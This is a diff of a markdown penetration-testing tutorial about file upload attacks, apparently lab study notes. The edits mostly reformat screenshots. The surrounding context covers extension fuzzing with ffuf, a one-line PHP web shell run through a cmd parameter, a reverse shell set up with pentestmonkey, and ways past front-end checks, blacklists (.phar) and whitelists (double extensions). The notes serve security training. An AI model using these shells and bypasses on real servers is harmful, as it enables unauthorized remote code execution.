@@ -57,7 +57,7 @@ The simplest case: the app has **no validation at all** and accepts any file typ
 
 Take this Employee File Manager. It says nothing about allowed types, and the drop zone happily accepts a `.php` file:
 
-![File manager upload form](assets/file-upload-attacks/file-manager-upload-form.png)
+![Employee File Manager](assets/file-upload-attacks/file-manager-upload-form.png "http://SERVER_IP:PORT")
 
 ![PHP file accepted by the front-end](assets/file-upload-attacks/php-file-accepted.png)
 
@@ -80,7 +80,8 @@ http://TARGET/index.jsp
 
 If `index.php` returns the same page as `/`, it's a PHP app:
 
-![index.php returns the same page](assets/file-upload-attacks/index-php-probe.png)
+![Employee File Manager](assets/file-upload-attacks/index-php-probe.png "http://SERVER_IP:PORT/index.php")
+
 
 **Method 2 — Fuzz the extension.** Don't do it by hand. Use a fuzzer with a web-extensions wordlist:
 
@@ -101,7 +102,8 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:EXT \
 - **BuiltWith** — web-based lookup for public sites.
 - **Burp / OWASP ZAP** passive scanners.
 
-![Wappalyzer showing PHP and server details](assets/file-upload-attacks/wappalyzer-fingerprint.png)
+![Employee File Manager](assets/file-upload-attacks/wappalyzer-fingerprint.png "http://SERVER_IP:PORT")
+
 
 !!! tip
     Tools are fast but can be wrong (or blocked). Always keep the manual `index.ext` trick in your back pocket — it works when extensions and scanners don't.
@@ -112,15 +114,19 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:EXT \
 
 Before throwing a shell, confirm the server *executes* your file rather than just storing it. Upload a minimal proof-of-concept. For PHP, write this to `test.php`:
 
-```php
+
+```php title="test.php"
 <?php echo "Hello World"; ?>
 ```
 
-![Uploading the test PHP file](assets/file-upload-attacks/upload-test-php.png)
+
+
+![Employee File Manager](assets/file-upload-attacks/upload-test-php.png "http://SERVER_IP:PORT")
 
 Then open the uploaded file:
 
-![Server prints "Hello World"](assets/file-upload-attacks/hello-world-output.png)
+![Server prints Hello World](assets/file-upload-attacks/hello-world-output.png "http://SERVER_IP:PORT/profile_images/test.php")
+
 
 If the page prints **Hello World**, PHP ran — you have code execution. If it prints the **raw source** instead, the file was stored but not executed (still potentially useful for XSS/other attacks, but not RCE here).
 
@@ -145,25 +151,23 @@ A web shell takes commands via HTTP and prints the output in your browser — gr
 
 Upload it, visit it, enumerate:
 
-<div class="ps-shell" data-title="www-data@target: /var/www/html" markdown>
-![phpbash terminal-like web shell](assets/file-upload-attacks/phpbash-web-shell.png)
-</div>
+![phpbash terminal-like web shell](assets/file-upload-attacks/phpbash-web-shell.png "http://SERVER_IP:PORT/")
 
 ### Option B — Write Your Own Web Shell
 
 You won't always have internet access mid-engagement, so memorize a one-liner. PHP:
 
-```php
+
+```php title="shell.php"
 <?php system($_REQUEST['cmd']); ?>
 ```
 
 Save as `shell.php`, upload, then run commands via the `cmd` parameter:
 
-```
-http://TARGET/uploads/shell.php?cmd=id
-```
+![Custom web shell running id](assets/file-upload-attacks/custom-web-shell-id.png "http://SERVER_IP:PORT/uploads/shell.php?cmd=id")
 
-![Custom web shell running id](assets/file-upload-attacks/custom-web-shell-id.png)
+
+
 
 !!! tip "Read output cleanly"
     In a browser, hit ++ctrl+u++ to view source — command output renders as plain terminal text without HTML mangling.
@@ -192,9 +196,7 @@ A reverse shell is fully interactive — almost always nicer than a web shell. M
 - **revshells.com** — online generator for dozens of payloads/languages; copy-paste ready.
 - **SecLists** — reverse shells for many frameworks.
 
-<div class="ps-editor" data-title="php-reverse-shell.php" markdown>
-![Editing IP and port in the pentestmonkey script](assets/file-upload-attacks/pentestmonkey-edit-ip-port.png)
-</div>
+![Editing IP and port in the pentestmonkey script](assets/file-upload-attacks/pentestmonkey-edit-ip-port.png "editor:php-reverse-shell.php")
 
 **2. Start a listener, upload, and trigger it:**
 
@@ -247,13 +249,9 @@ Many apps validate the file in the browser with JavaScript only. Since **anythin
 
 Here's a profile-image uploader. The file dialog is locked to images:
 
-<div class="ps-browser" data-url="http://SERVER_IP:PORT/" markdown>
-![Profile image upload feature](assets/file-upload-attacks/profile-image-upload.png)
-</div>
+![Profile image upload feature](assets/file-upload-attacks/profile-image-upload.png "http://SERVER_IP:PORT/")
 
-<div class="ps-image" data-title="file-dialog.png" markdown>
-![File dialog limited to image formats](assets/file-upload-attacks/file-dialog-images-only.png)
-</div>
+![File dialog limited to image formats](assets/file-upload-attacks/file-dialog-images-only.png "image:file-dialog.png")
 
 Picking *All Files* and selecting a PHP script throws "Only images are allowed!" and disables the Upload button — and notice the page never sends a request, confirming validation is purely front-end:
 
@@ -346,9 +344,7 @@ The exercise we find in this section is similar to the one we saw in the previou
 
 Let's start by trying one of the client-side bypasses we learned in the previous section to upload a PHP script to the back-end server. We'll intercept an image upload request with Burp, replace the file content and filename with our PHP script's, and forward the request:
 
-<div class="ps-browser" data-url="http://154.57.164.81:32687" markdown>
-![](image.png)
-</div>
+![Extension not allowed response](image.png "http://154.57.164.81:32687")
 
 As we can see, our attack did not succeed this time, as we gotExtension not allowed . This indicates that the web application may have some form of file type validation on the back-end, in addition to the front-end validations.
 
@@ -409,9 +405,7 @@ Let's use the `.phar` extension, which PHP web servers often allow for code exec
 As we can see, our file seems to have indeed been uploaded. The final step is to visit our upload file, which should be under the image upload directory (profile_images), as we saw in the previous section. Then, we can test executing a command, which should confirm that we successfully bypassed the blacklist and uploaded our web shell:
 
 
-<div class="ps-browser" data-url="http://154.57.164.68:32525/profile_images/shell.phar?cmd=id" markdown>
-![](image-3.png)
-</div>
+![Web shell executing id via the phar upload](image-3.png "http://154.57.164.68:32525/profile_images/shell.phar?cmd=id")
 
 
 ## Whitelist Filters
@@ -425,9 +419,7 @@ Still, there are different use cases for a blacklist and for a whitelist. A blac
 Let's start the exercise at the end of this section and attempt to upload an uncommon PHP extension, like.phtml , and see if we are still able to upload it as we did in the previous section:
 
 
-<div class="ps-browser" data-url="154.57.164.72:30653" markdown>
-![Employee File Manager](image-5.png)
-</div>
+![Employee File Manager](image-5.png "browser:154.57.164.72:30653")
 
 
 We see that we get a message sayingOnly images are allowed , which may be more common in web apps than seeing a blocked extension type. However, error messages do not always reflect which form of validation is being utilized, so let's try to fuzz for allowed extensions as we did in the previous section, using the same wordlist that we used previously:
@@ -461,9 +453,7 @@ Let's intercept a normal upload request, and modify the file name to (shell.php.
 
 Now, if we visit the uploaded file and try to send a command, we can see that it does indeed successfully execute system commands, meaning that the file we uploaded is a fully working PHP script:
 
-<div class="ps-browser" data-url="http://154.57.164.72:30653/profile_images/shell.phar.jpg?cmd=id" markdown>
-![](image-8.png)
-</div>
+![Web shell executing id via the double-extension upload](image-8.png "http://154.57.164.72:30653/profile_images/shell.phar.jpg?cmd=id")
 
 However, this may not always work, as some web applications may use a strict regex pattern, as mentioned earlier, like the following:
 
